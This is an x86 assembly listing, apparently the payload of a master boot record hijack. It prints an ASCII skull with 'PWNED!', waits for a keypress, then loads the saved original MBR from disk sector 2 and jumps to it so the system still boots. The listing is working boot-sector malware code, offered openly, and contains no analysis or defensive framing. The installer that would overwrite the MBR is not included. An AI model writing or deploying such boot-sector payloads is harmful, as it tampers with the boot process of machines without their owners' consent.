org 0x0600

jmp start
message:
db 0dh,0ah,'                          oooo$$$$$$$$$$$$oooo',0dh,0ah,'                      oo$$$$$$$$$$$$$$$$$$$$$$$$o',0dh,0ah,'                   oo$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$o         o$   $$ o$',0dh,0ah,'   o $ oo        o$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$o       $$ $$ $$o$',0dh,0ah,'oo $ $ "$      o$$$$$$$$$    $$$$$$$$$$$$$    $$$$$$$$$o       $$$o$$o$',0dh,0ah,'"$$$$$$o$     o$$$$$$$$$      $$$$$$$$$$$      $$$$$$$$$$o    $$$$$$$$',0dh,0ah,'  $$$$$$$    $$$$$$$$$$$      $$$$$$$$$$$      $$$$$$$$$$$$$$$$$$$$$$$',0dh,0ah,'  $$$$$$$$$$$$$$$$$$$$$$$    $$$$$$$$$$$$$    $$$$$$$$$$$$$$  """$$$',0dh,0ah,'   "$$$""""$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     "$$$',0dh,0ah,'    $$$   o$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     "$$$o',0dh,0ah,'   o$$"   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$       $$$o',0dh,0ah,'   $$$    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$" "$$$$$$ooooo$$$$o',0dh,0ah,'  o$$$oooo$$$$$  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$   o$$$$$$$$$$$$$$$$$',0dh,0ah,'  $$$$$$$$"$$$$   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     $$$$""""""""',0dh,0ah,' """"       $$$$    "$$$$$$$$$$$$$$$$$$$$$$$$$$$$"      o$$$',0dh,0ah,'            "$$$o     """$$$$$$$$$$$$$$$$$$"$$"         $$$',0dh,0ah,'              $$$o          "$$""$$$$$$""""           o$$$',0dh,0ah,'               $$$$o                 oo             o$$$"',0dh,0ah,'                "$$$$o      o$$$$$$o"$$$$o        o$$$$',0dh,0ah,'                  "$$$$$oo     ""$$$$o$$$$$o   o$$$$""',0dh,0ah,'                     ""$$$$$oooo  "$$$o$$$$$$$$$"""',0dh,0ah,'                        ""$$$$$$$oo $$$$$$$$$$',0dh,0ah,'                                """"$$$$$$$$$$$',0dh,0ah,'                                    $$$$$$$$$$$$',0dh,0ah,'                                     $$$$$$$$$$"',0dh,0ah,'                                       "$$$""""',0dh,0ah,0dh,0ah,'PWNED!',0dh,0ah,0

print_str:
printloop:
lodsb
cmp al, 00h
jz printend
mov ah, 0eh
int 10h
jmp printloop
printend:
ret

start:
mov ah, 0h
mov al, 12h
int 10h
mov bl, 0eh
mov si, message
call print_str
mov ah, 00h
int 16h

; loads sector #2 and execute it
; NB : if the original MBR is not a simple MBR
; (ie. GRUB), the #2 sector will probably not be
; the saved MBR code.
mov al, 01h
mov ch, 00h
mov cl, 02h
mov dh, 00h
mov dl, 80h
mov bx, 00h
mov es, bx
mov bx, 7c00h
mov ah, 02h
int 13h

mov bx, 0000h
push bx
mov bx, 7c00h
push bx
retf


